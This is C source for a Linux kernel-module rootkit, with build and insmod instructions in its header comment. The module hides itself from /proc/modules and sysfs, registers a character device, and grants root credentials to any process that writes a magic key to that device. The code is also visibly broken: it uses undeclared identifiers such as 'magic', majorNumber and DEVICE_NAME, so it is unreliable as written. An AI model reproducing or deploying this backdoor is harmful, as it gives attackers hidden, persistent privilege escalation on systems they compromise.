/*
Just learning some tings

Makefile: 
-----------
obj-m += r00tk1t.o

all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
------------
then: $ insmod rootkit.ko
and we good to g0g0!
*/

#include <linux/module.h>   
#include <linux/kernel.h>   
#include <linux/init.h> 
#include <linux/kobject.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/string.h>
#include <linux/slab.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Ka^Io");

int el3v4t3(void);

static struct file_operations fops =
{
  .open = root_open,
  .read = root_read,
  .write = root_write,
};

static int root_open (struct inode *inode, struct file *f)
{
   return 0;
}

static ssize_t root_read (struct file *f, char *buf, size_t len, loff_t *off)
{
  return len;
}

static ssize_t root_write (struct file *f, const char __user *buf, size_t len, loff_t *off)
{ 
  char   *data;
  char   key[] = "KA10";
  
  data = (char *) kmalloc (len + 1, GFP_KERNEL);
    
  if (data)
  {
    copy_from_user (data, buf, len);
        if (memcmp(data, magic, 7) == 0)
        {
	        el3v4t3();
        }
        kfree(data);
      }
    else
      {
	printk(KERN_ALERT "ttyRK:Unable to allocate memory");
      }
    
    return len;
}

int c0v3rtr4x(void)
{
    list_del_init(&__this_module.list); // for proc/modules
    kobject_del(&THIS_MODULE->mkobj.kobj);   // for sys/module
    return 0;
}

int el3v4t3(void)
{
    struct task_struct *t4sk;
    struct cred *cr3d;
    kuid_t kuid = KUIDT_INIT(0);
    kgid_t kgid = KGIDT_INIT(0);

    t4sk = get_current();
    if (t4sk == NULL) {
      printk("Failed to get current task info.\n");
      return -1;
    }

    cr3d = prepare_creds();
    if (cr3d == NULL) {
      printk("Failed to prepare new credentials\n");
      return -ENOMEM;
    }

    cr3d->uid = kuid;
    cr3d->gid = kgid;
    cr3d->euid = kuid;
    cr3d->egid = kgid;

    commit_creds(cr3d);
    return 0;    
}

static int __init g0g0(void)
{
   c0v3rtr4x();
    
   if ((majorNumber = register_chrdev(0, DEVICE_NAME, &fops)) < 0)
    {
      printk(KERN_ALERT "ttyRK failed to register a major number\n");
      return majorNumber;
    }
   printk(KERN_INFO "ttyRK: major number %d\n", majorNumber);
 
   // Register the device class
   rootcharClass = class_create(THIS_MODULE, CLASS_NAME);
   if (IS_ERR(rootcharClass))
     {
       unregister_chrdev(majorNumber, DEVICE_NAME);
       printk(KERN_ALERT "ttyRK: Failed to register device class\n");
       return PTR_ERR(rootcharClass); 
   }

   printk(KERN_INFO "ttyRK: device class registered correctly\n");
 
   // Register the device driver
   rootcharDevice = device_create(rootcharClass, NULL,
				  MKDEV(majorNumber, 0), NULL, DEVICE_NAME);
   if (IS_ERR(rootcharDevice))
     {
       class_destroy(rootcharClass);
       unregister_chrdev(majorNumber, DEVICE_NAME);
       printk(KERN_ALERT "ttyRK: Failed to create the device\n");
       return PTR_ERR(rootcharDevice);
     }

   return 0;
}

static void __exit farewell(void)
{
    printk(KERN_INFO "goodbye\n");
    return;
}

module_init(g0g0);
module_exit(farewell);
